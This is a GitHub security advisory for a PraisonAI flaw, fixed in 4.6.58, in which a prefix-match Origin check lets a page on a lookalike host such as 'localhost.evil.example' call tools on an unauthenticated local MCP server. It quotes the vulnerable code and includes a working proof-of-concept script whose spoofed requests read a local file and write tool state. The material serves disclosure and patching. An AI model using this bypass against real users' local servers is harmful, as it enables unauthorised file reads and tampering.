# [M] PraisonAI has an origin validation bypass in MCP HTTP Stream transport that allows browser-mediated unauthenticated tool execution on local MCP server

## Summary
Severity: Medium
Advisory: GHSA-wj6g-v78p-6fx3
CVE: CVE-2026-55529
CWE: CWE-306, CWE-346
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:L/A:N (CVSS_V3)
Published: 2026-08-25
Source: https://github.com/advisories/GHSA-wj6g-v78p-6fx3
Type: github-advisory

## Affected
- PyPI: `PraisonAI` — affected >=0 <4.6.58

## Details
### Summary

PraisonAI's MCP HTTP Stream transport uses an unsafe prefix match when validating the `Origin` header. The default localhost allowlist includes origins such as `http://localhost`, and the validation accepts any origin that starts with an allowed value.

As a result, an attacker-controlled origin such as `http://localhost.evil.example` passes the localhost origin check.

When the MCP HTTP Stream server is started without an API key, which is the CLI default, this allows a malicious webpage to trigger unauthenticated MCP `tools/call` requests against a locally running PraisonAI MCP server.

This is best framed as a browser-mediated localhost attack / DNS-rebinding-style Origin validation bypass. The default server binds to `127.0.0.1`, so this is not a directly internet-facing unauthenticated API in the default configuration.

### Details

Relevant source locations:

- `src/praisonai/praisonai/mcp_server/cli.py`
- `src/praisonai/praisonai/mcp_server/transports/http_stream.py`
- `src/praisonai/praisonai/mcp_server/server.py`
- `src/praisonai/praisonai/mcp_server/adapters/__init__.py`
- `src/praisonai/praisonai/mcp_server/adapters/extended_capabilities.py`
- `src/praisonai/praisonai/mcp_server/adapters/cli_tools.py`
- `src/praisonai/praisonai/capabilities/files.py`

The MCP CLI defaults to HTTP host `127.0.0.1`, API key `None`, and allowed origins `None` unless explicitly configured:

```python
parser.add_argument("--host", default="127.0.0.1")
parser.add_argument("--port", type=int, default=8080)
parser.add_argument("--api-key", default=None)
parser.add_argument("--allowed-origins", default=None, help="Comma-separated allowed origins for security")
```

The CLI registers all tools and passes the optional API key and allowed origins into the HTTP Stream transport:

```python
register_all()

server.run_http_stream(
    host=parsed.host,
    port=parsed.port,
    endpoint=parsed.endpoint,
    api_key=parsed.api_key,
    cors_origins=cors_origins,
    allowed_origins=allowed_origins,
    session_ttl=parsed.session_ttl,
    allow_client_termination=allow_termination,
    response_mode=parsed.response_mode,
    resumability_enabled=parsed.resumability,
)
```

When `allowed_origins` is not explicitly configured and the server binds to localhost, the transport allowlist includes bare localhost origins:

```python
if allowed_origins is None:
    if host in ("127.0.0.1", "localhost", "::1"):
        self.allowed_origins = [
            "http://localhost",
            "http://127.0.0.1",
            "https://localhost",
            "https://127.0.0.1",
        ]
```

The vulnerable validation accepts origins that merely start with an allowlisted value:

```python
for allowed in self.allowed_origins:
    if request_origin == allowed or request_origin.startswith(allowed):
        return True
```

Because `http://localhost.evil.example` starts with `http://localhost`, it is accepted as a trusted localhost origin.

Authentication is only enforced if an API key is configured:

```python
if self.api_key:
    auth_header = request.headers.get("Authorization", "")
    if not auth_header.startswith("Bearer ") or auth_header[7:] != self.api_key:
        return JSONResponse(
            {"error": "Unauthorized"},
            status_code=401,
        )
```

The request body is then parsed and dispatched to the MCP server:

```python
body = await request.json()
response = await self.server.handle_message(body)
```

The MCP server handles `tools/call` by looking up the named tool and invoking the registered handler with attacker-controlled arguments:

```python
tool_name = params.get("name")
arguments = params.get("arguments", {})

tool = self._tool_registry.get(tool_name)

if asyncio.iscoroutinefunction(tool.handler):
    result = await tool.handler(**arguments)
else:
    result = tool.handler(**arguments)
```

`register_all()` registers capability tools, extended capability tools, CLI tools, resources, and prompts:

```python
def _register_all():
    register_all_tools()
    register_extended_capability_tools()
    register_cli_tools()
    register_mcp_resources()
    register_mcp_prompts()
```

One exposed MCP tool is `praisonai.files.create`, which accepts a local `file_path` and passes it to `file_create()`:

```python
@register_tool("praisonai.files.create")
def files_create(file_path: str, purpose: str = "assistants") -> str:
    from praisonai.capabilities import file_create
    result = file_create(file=file_path, purpose=purpose)
```

`file_create()` opens attacker-selected string paths as local files and passes the file object to LiteLLM:

```python
file_obj = file
if isinstance(file, str):
    file_obj = open(file, 'rb')

response = litellm.create_file(**call_kwargs)
```

Another exposed MCP tool, `praisonai.todo.add`, writes attacker-supplied content into local PraisonAI state at `~/.praison/todo.json`.

### PoC

The following local PoC verifies the vulnerable Origin logic and unauthenticated MCP tool execution without contacting any external provider. It uses a fake in-memory `litellm` module so the file-read effect is captured locally and safely.

Run from the repository root with test dependencies installed:

```bash
python3 poc_mcp_origin_bypass.py
```

`poc_mcp_origin_bypass.py`:

```python
import json
import os
import sys
import tempfile
import types
from pathlib import Path

from starlette.testclient import TestClient

ROOT = Path.cwd()
sys.path.insert(0, str(ROOT / "src" / "praisonai"))
sys.path.insert(0, str(ROOT / "src" / "praisonai-agents"))

# Fake litellm so the PoC proves local file read without network exfiltration.
captured = {}
fake_litellm = types.ModuleType("litellm")

def create_file(**kwargs):
    f = kwargs["file"]
    captured["filename"] = getattr(f, "name", "<bytes>")
    captured["content"] = f.read().decode("utf-8")

    class Resp:
        id = "file-safe-local-poc"
        object = "file"
        bytes = len(captured["content"])
        filename = captured["filename"]
        purpose = kwargs.get("purpose")
        status = "processed"

    return Resp()

fake_litellm.create_file = create_file
sys.modules["litellm"] = fake_litellm

from praisonai.mcp_server.server import MCPServer
from praisonai.mcp_server.transports.http_stream import HTTPStreamTransport
from praisonai.mcp_server.adapters import register_all

register_all()
server = MCPServer(name="praisonai-local-poc")

# Default vulnerable configuration: localhost host, no API key, default allowed origins.
transport = HTTPStreamTransport(
    server=server,
    host="127.0.0.1",
    api_key=None,
    allowed_origins=None,
)
app = transport._create_app()
client = TestClient(app)

with tempfile.TemporaryDirectory() as td:
    os.environ["HOME"] = td

    marker = Path(td) / "safe-marker.txt"
    marker.write_text("SAFE_LOCAL_MARKER_MCP_FILE_READ")

    file_payload = {
        "jsonrpc": "2.0",
        "id": 1,
        "method": "tools/call",
        "params": {
            "name": "praisonai.files.create",
            "arguments": {
                "file_path": str(marker),
                "purpose": "assistants",
            },
        },
    }

    # Non-localhost malicious origin is blocked.
    blocked = client.post(
        "/mcp",
        data=json.dumps(file_payload),
        headers={
            "Origin": "https://evil.example",
            "Content-Type": "text/plain",
        },
    )

    # Prefix-matching bypass: accepted because it starts with http://localhost.
    bypass = client.post(
        "/mcp",
        data=json.dumps(file_payload),
        headers={
            "Origin": "http://localhost.evil.example",
            "Content-Type": "text/plain",
        },
    )

    todo_payload = {
        "jsonrpc": "2.0",
        "id": 2,
        "method": "tools/call",
        "params": {
            "name": "praisonai.todo.add",
            "arguments": {
                "content": "SAFE_LOCAL_TODO_MARKER",
                "priority": "high",
            },
        },
    }

    todo = client.post(
        "/mcp",
        data=json.dumps(todo_payload),
        headers={
            "Origin": "http://localhost.evil.example",
            "Content-Type": "text/plain",
        },
    )

    todo_file = Path(td) / ".praison" / "todo.json"

    print(json.dumps({
        "blocked_origin_status": blocked.status_code,
        "bypass_origin_status": bypass.status_code,
        "bypass_response_text": bypass.json().get("result", {}).get("content", [{}])[0].get("text"),
        "captured_file_basename": Path(captured.get("filename", "")).name,
        "captured_file_content": captured.get("content"),
        "todo_status": todo.status_code,
        "todo_response_text": todo.json().get("result", {}).get("content", [{}])[0].get("text"),
        "todo_file_exists": todo_file.exists(),
    }, indent=2))
```

Observed output:

```json
{
  "blocked_origin_status": 403,
  "bypass_origin_status": 200,
  "bypass_response_text": "File created: file-safe-local-poc",
  "captured_file_basename": "safe-marker.txt",
  "captured_file_content": "SAFE_LOCAL_MARKER_MCP_FILE_READ",
  "todo_status": 200,
  "todo_response_text": "Todo added: 0440613d",
  "todo_file_exists": true
}
```

The important results are:

- `Origin: https://evil.example` is rejected with `403`.
- `Origin: http://localhost.evil.example` is accepted with `200`.
- The bypassed request invokes `praisonai.files.create` and reads the local safe marker file.
- The bypassed request invokes `praisonai.todo.add` and writes local PraisonAI state.

### Impact

A malicious webpage can bypass the localhost Origin allowlist and trigger MCP `tools/call` requests against a locally running unauthenticated HTTP Stream server.

In local testing, this allowed invoking registered PraisonAI tools that:

- read an attacker-selected local file path and pass the file handle to the configured LiteLLM provider; and
- modify local PraisonAI state by writing to `~/.praison/todo.json`.

The default MCP HTTP Stream bind address is localhost, so exploitation is browser-mediated. A practical attack requires the victim to run the HTTP Stream MCP server without an API key and visit an attacker-controlled origin that matches the prefix bypass, or a DNS-rebinding-style setup. If an API key is configured, exploitability is significantly reduced.

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-wj6g-v78p-6fx3
- https://github.com/MervinPraison/PraisonAI/commit/2f9677abb2ea68eab864ee8b6a828fd0141612e1
- https://github.com/MervinPraison/PraisonAI
- https://github.com/MervinPraison/PraisonAI/releases/tag/v4.6.58
